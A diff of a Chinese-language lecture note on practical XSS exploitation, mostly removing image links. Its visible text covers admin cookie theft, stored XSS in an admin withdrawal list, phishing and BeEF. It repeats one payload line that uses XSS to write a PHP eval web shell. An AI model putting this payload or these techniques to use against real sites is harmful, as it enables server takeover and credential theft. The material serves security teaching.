@@ -12,37 +12,25 @@
 
 ![](img/8da8e0e1f87a1abc1033c7807feddf84_11.png)
 
-![](img/8da8e0e1f87a1abc1033c7807feddf84_12.png)
 
 ![](img/8da8e0e1f87a1abc1033c7807feddf84_14.png)
 
 ![](img/8da8e0e1f87a1abc1033c7807feddf84_16.png)
 
-![](img/8da8e0e1f87a1abc1033c7807feddf84_18.png)
 
 在本节课中，我们将深入学习跨站脚本攻击的实战利用。课程将涵盖从基础的Cookie窃取，到结合后台数据包进行自动化攻击，再到利用钓鱼页面和高级攻击平台进行综合渗透。我们还会学习如何自主搭建XSS平台，以避免使用公共平台带来的风险。
 
-![](img/8da8e0e1f87a1abc1033c7807feddf84_20.png)
 
-![](img/8da8e0e1f87a1abc1033c7807feddf84_21.png)
 
-![](img/8da8e0e1f87a1abc1033c7807feddf84_23.png)
 
-![](img/8da8e0e1f87a1abc1033c7807feddf84_25.png)
 
-![](img/8da8e0e1f87a1abc1033c7807feddf84_27.png)
 
-![](img/8da8e0e1f87a1abc1033c7807feddf84_29.png)
 
-![](img/8da8e0e1f87a1abc1033c7807feddf84_31.png)
 
 ---
 
-![](img/8da8e0e1f87a1abc1033c7807feddf84_33.png)
 
-![](img/8da8e0e1f87a1abc1033c7807feddf84_35.png)
 
-![](img/8da8e0e1f87a1abc1033c7807feddf84_37.png)
 
 ![](img/8da8e0e1f87a1abc1033c7807feddf84_39.png)
 
@@ -50,9 +38,7 @@
 
 ## 🔍 回顾与问题定位
 
-![](img/8da8e0e1f87a1abc1033c7807feddf84_43.png)
 
-![](img/8da8e0e1f87a1abc1033c7807feddf84_45.png)
 
 ![](img/8da8e0e1f87a1abc1033c7807feddf84_47.png)
 
@@ -62,11 +48,9 @@
 
 上一节课我们尝试利用小皮面板的XSS漏洞获取管理员Cookie，但实验未能成功。本节我们首先来分析失败的原因并找到解决方案。
 
-![](img/8da8e0e1f87a1abc1033c7807feddf84_53.png)
 
 实验失败并非因为XSS语句未执行，而是因为目标系统除了Cookie验证外，还使用了额外的令牌机制（如 `access_token`）。因此，仅获取Cookie不足以通过身份验证。
 
-![](img/8da8e0e1f87a1abc1033c7807feddf84_55.png)
 
 ![](img/8da8e0e1f87a1abc1033c7807feddf84_57.png)
 
@@ -82,39 +66,27 @@
 
 ![](img/8da8e0e1f87a1abc1033c7807feddf84_67.png)
 
-![](img/8da8e0e1f87a1abc1033c7807feddf84_69.png)
 
-![](img/8da8e0e1f87a1abc1033c7807feddf84_71.png)
 
 ![](img/8da8e0e1f87a1abc1033c7807feddf84_73.png)
 
 ---
 
-![](img/8da8e0e1f87a1abc1033c7807feddf84_75.png)
 
-![](img/8da8e0e1f87a1abc1033c7807feddf84_77.png)
 
-![](img/8da8e0e1f87a1abc1033c7807feddf84_79.png)
 
-![](img/8da8e0e1f87a1abc1033c7807feddf84_81.png)
 
 ![](img/8da8e0e1f87a1abc1033c7807feddf84_83.png)
 
-![](img/8da8e0e1f87a1abc1033c7807feddf84_85.png)
 
 ## 🛠️ 进阶利用：JS代码写入后门
 
 ![](img/8da8e0e1f87a1abc1033c7807feddf84_87.png)
 
-![](img/8da8e0e1f87a1abc1033c7807feddf84_89.png)
 
-![](img/8da8e0e1f87a1abc1033c7807feddf84_91.png)
 
-![](img/8da8e0e1f87a1abc1033c7807feddf84_92.png)
 
-![](img/8da8e0e1f87a1abc1033c7807feddf84_94.png)
 
-![](img/8da8e0e1f87a1abc1033c7807feddf84_96.png)
 
 ![](img/8da8e0e1f87a1abc1033c7807feddf84_98.png)
 
@@ -126,11 +98,8 @@
 
 ![](img/8da8e0e1f87a1abc1033c7807feddf84_104.png)
 
-![](img/8da8e0e1f87a1abc1033c7807feddf84_105.png)
 
-![](img/8da8e0e1f87a1abc1033c7807feddf84_107.png)
 
-![](img/8da8e0e1f87a1abc1033c7807feddf84_109.png)
 
 ![](img/8da8e0e1f87a1abc1033c7807feddf84_110.png)
 
@@ -143,13 +112,9 @@
 
 ![](img/8da8e0e1f87a1abc1033c7807feddf84_112.png)
 
-![](img/8da8e0e1f87a1abc1033c7807feddf84_114.png)
 
-![](img/8da8e0e1f87a1abc1033c7807feddf84_116.png)
 
-![](img/8da8e0e1f87a1abc1033c7807feddf84_118.png)
 
-![](img/8da8e0e1f87a1abc1033c7807feddf84_120.png)
 
 ![](img/8da8e0e1f87a1abc1033c7807feddf84_121.png)
 
@@ -157,13 +122,9 @@
 
 ![](img/8da8e0e1f87a1abc1033c7807feddf84_123.png)
 
-![](img/8da8e0e1f87a1abc1033c7807feddf84_125.png)
 
-![](img/8da8e0e1f87a1abc1033c7807feddf84_127.png)
 
-![](img/8da8e0e1f87a1abc1033c7807feddf84_129.png)
 
-![](img/8da8e0e1f87a1abc1033c7807feddf84_131.png)
 
 ![](img/8da8e0e1f87a1abc1033c7807feddf84_133.png)
 
@@ -194,7 +155,6 @@ xhr.send('filename=1.php&content=<?php @eval($_POST["cmd"]);?>');
 
 ![](img/8da8e0e1f87a1abc1033c7807feddf84_148.png)
 
-![](img/8da8e0e1f87a1abc1033c7807feddf84_149.png)
 
 ---
 
@@ -202,7 +162,6 @@ xhr.send('filename=1.php&content=<?php @eval($_POST["cmd"]);?>');
 
 ![](img/8da8e0e1f87a1abc1033c7807feddf84_153.png)
 
-![](img/8da8e0e1f87a1abc1033c7807feddf84_155.png)
 
 ![](img/8da8e0e1f87a1abc1033c7807feddf84_157.png)
 
@@ -228,7 +187,6 @@ xhr.send('filename=1.php&content=<?php @eval($_POST["cmd"]);?>');
 
 ![](img/8da8e0e1f87a1abc1033c7807feddf84_174.png)
 
-![](img/8da8e0e1f87a1abc1033c7807feddf84_176.png)
 
 ![](img/8da8e0e1f87a1abc1033c7807feddf84_178.png)
 
@@ -245,11 +203,9 @@ xhr.send('filename=1.php&content=<?php @eval($_POST["cmd"]);?>');
 
 ![](img/8da8e0e1f87a1abc1033c7807feddf84_184.png)
 
-![](img/8da8e0e1f87a1abc1033c7807feddf84_186.png)
 
 > **注意**：实验过程中需确保文件路径正确，并注意目标系统的目录权限。
 
-![](img/8da8e0e1f87a1abc1033c7807feddf84_188.png)
 
 ![](img/8da8e0e1f87a1abc1033c7807feddf84_190.png)
 
@@ -277,9 +233,7 @@ xhr.send('filename=1.php&content=<?php @eval($_POST["cmd"]);?>');
 
 ![](img/8da8e0e1f87a1abc1033c7807feddf84_208.png)
 
-![](img/8da8e0e1f87a1abc1033c7807feddf84_210.png)
 
-![](img/8da8e0e1f87a1abc1033c7807feddf84_212.png)
 
 **漏洞点**：用户“结算账号”信息会在后台的“提现申请”列表中显示。
 
@@ -299,13 +253,9 @@ xhr.send('filename=1.php&content=<?php @eval($_POST["cmd"]);?>');
 
 **技术要点**：这种“存储型XSS”利用的是用户输入在后台展示的环节，关键在于找到“管理员必然会查看”的数据点。
 
-![](img/8da8e0e1f87a1abc1033c7807feddf84_218.png)
 
-![](img/8da8e0e1f87a1abc1033c7807feddf84_220.png)
 
-![](img/8da8e0e1f87a1abc1033c7807feddf84_222.png)
 
-![](img/8da8e0e1f87a1abc1033c7807feddf84_224.png)
 
 ---
 
@@ -335,7 +285,6 @@ XSS不仅可以窃取数据，还能与钓鱼攻击结合，诱导用户执行�
 
 ![](img/8da8e0e1f87a1abc1033c7807feddf84_245.png)
 
-![](img/8da8e0e1f87a1abc1033c7807feddf84_247.png)
 
 ![](img/8da8e0e1f87a1abc1033c7807feddf84_249.png)
 
@@ -382,7 +331,6 @@ XSS不仅可以窃取数据，还能与钓鱼攻击结合，诱导用户执行�
 
 ---
 
-![](img/8da8e0e1f87a1abc1033c7807feddf84_279.png)
 
 ![](img/8da8e0e1f87a1abc1033c7807feddf84_281.png)
 
@@ -396,9 +344,7 @@ XSS不仅可以窃取数据，还能与钓鱼攻击结合，诱导用户执行�
 
 依赖公共XSS平台存在风险（如特征被识别、不稳定）。因此，掌握自主搭建能力至关重要。
 
-![](img/8da8e0e1f87a1abc1033c7807feddf84_289.png)
 
-![](img/8da8e0e1f87a1abc1033c7807feddf84_291.png)
 
 ![](img/8da8e0e1f87a1abc1033c7807feddf84_293.png)
 
@@ -498,9 +444,7 @@ docker run -p 3000:3000 janes/beef
 
 ![](img/8da8e0e1f87a1abc1033c7807feddf84_356.png)
 
-![](img/8da8e0e1f87a1abc1033c7807feddf84_358.png)
 
-![](img/8da8e0e1f87a1abc1033c7807feddf84_360.png)
 
 ![](img/8da8e0e1f87a1abc1033c7807feddf84_362.png)
 
@@ -508,7 +452,6 @@ docker run -p 3000:3000 janes/beef
 
 ## 📚 课程总结
 
-![](img/8da8e0e1f87a1abc1033c7807feddf84_364.png)
 
 ![](img/8da8e0e1f87a1abc1033c7807feddf84_366.png)
 
@@ -516,7 +459,6 @@ docker run -p 3000:3000 janes/beef
 
 ![](img/8da8e0e1f87a1abc1033c7807feddf84_370.png)
 
-![](img/8da8e0e1f87a1abc1033c7807feddf84_372.png)
 
 ![](img/8da8e0e1f87a1abc1033c7807feddf84_374.png)
 
@@ -548,7 +490,6 @@ XSS的危害远不止弹窗，它是一条通往服务器权限、用户凭证�
 
 ![](img/8da8e0e1f87a1abc1033c7807feddf84_390.png)
 
-![](img/8da8e0e1f87a1abc1033c7807feddf84_392.png)
 
 ![](img/8da8e0e1f87a1abc1033c7807feddf84_394.png)
 
@@ -556,7 +497,6 @@ XSS的危害远不止弹窗，它是一条通往服务器权限、用户凭证�
 
 ![](img/8da8e0e1f87a1abc1033c7807feddf84_398.png)
 
-![](img/8da8e0e1f87a1abc1033c7807feddf84_400.png)
 
 ![](img/8da8e0e1f87a1abc1033c7807feddf84_402.png)
 
